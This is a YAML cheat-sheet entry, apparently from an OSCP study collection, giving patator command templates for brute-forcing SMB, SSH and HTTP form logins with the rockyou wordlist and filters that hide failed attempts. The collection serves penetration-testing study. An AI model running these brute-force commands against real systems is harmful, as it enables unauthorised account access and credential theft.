---
variants:
  - label: smb
    command: |
      patator smb_login host=$IP user=$USER password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:fgrep='STATUS_LOGON_FAILURE'
  - label: ssh
    command: |
      patator ssh_login host=$IP user=$USER password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Authentication failed.'
  - label: http-form
    command: |
      patator http_fuzz url=$URL method=POST body='username=$USER&password=FILE0' 0=/usr/share/wordlists/rockyou.txt -x ignore:fgrep='Invalid'
description: Multi protocol brute forcer whose ignore rules filter out the noise of failed attempts
os: [Linux]
category: [oscp, cli]
service: [SMB, SSH, HTTP]
phase: [CredAccess]
references:
  - https://www.kali.org/tools/patator/
---
